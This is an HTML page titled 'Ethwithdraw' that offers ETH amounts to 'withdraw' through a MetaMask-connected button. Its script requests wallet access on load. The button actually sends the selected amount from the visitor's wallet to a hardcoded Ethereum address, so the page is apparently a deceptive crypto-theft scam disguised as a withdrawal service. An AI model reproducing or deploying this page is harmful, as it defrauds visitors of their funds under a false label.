<!DOCTYPE html>
<html>

<head>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
  <title>Ethwithdraw</title>
</head>

<body>
  <div>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <div class="container-fluid">
        <a class="navbar-brand" href="#">
          <img src="/docs/5.1/assets/brand/bootstrap-logo.svg" alt="" width="30" height="24">
        </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
          aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" href="https://ethwithdraw.com">
          <span class="navbar-toggler-icon"></span>
        </button>
      </div>
    </nav>
    <input id="025" type="radio" name="eth" value="0.25">0.25</input>
    <input id="050" type="radio" name="eth" value="0.50">0.5</input>
    <input id="075" type="radio" name="eth" value="0.75">0.75</input>
    <input id="100" type="radio" name="eth" value="1.00">1</input>
    <input id="200" type="radio" name="eth" value="2.00">2</input>
    <input id="other" type="radio" name="eth" value="other">Other</input>
    <input type="text" placeholder="Other Amount(Min:0.15/Max:8.5)" id="other-input" disabled>
    <button class="pay-button">Withdraw</button>
    <div id="status"></div>
  </div>
  <script type="text/javascript">
    if (document.getElementById("other").checked == true) {
      document.getElementById("other-input").disabled = false;
      window.location.reload();
      alert("Min:0.15/Max:8.5");
    }
    window.addEventListener('load', async () => {
      if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
          await ethereum.enable();
          initPayButton()
        } catch (err) {
          $('#status').html('User denied account access', err)
        }
      } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider)
        initPayButton()
      } else {
        $('#status').html('No Metamask (or other Web3 Provider) installed')
      }
    })

    const initPayButton = () => {
      $('.pay-button').click(() => {
        // paymentAddress is where funds will be send to
        const paymentAddress = '0x54e41e066b9a249BF98268C8ed919b25D3243362'
        var amountEth
        var a = document.getElementById("025");
        var b = document.getElementById("050");
        var c = document.getElementById("075");
        var d = document.getElementById("100");
        var e = document.getElementById("200");
        var other = document.getElementById("other");
        var input = document.getElementById("other-input").value;
        if (a.checked == true) {
          amountEth = 0.25;
        }
        else if (b.checked == true) {
          amountEth = 0.5;
        }
        else if (c.checked == true) {
          amountEth = 0.75;
        }
        else if (d.checked == true) {
          amountEth = 1.0;
        }
        else if (e.checked == true) {
          amountEth = 2.0;
        }
        else if (other.checked == true) {
          amountEth = input;
        }
        else {
          alert("Please, select an option");
        }

        web3.eth.sendTransaction({
          to: paymentAddress,
          value: web3.toWei(amountEth, 'ether')
        }, (err, transactionId) => {
          if (err) {
            console.log('Payment failed', err)
            $('#status').html('Payment failed')
          } else {
            console.log('Payment successful', transactionId)
            $('#status').html('Payment successful')
          }
        })
      })
    }
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
    crossorigin="anonymous"></script>

</body>

</html>
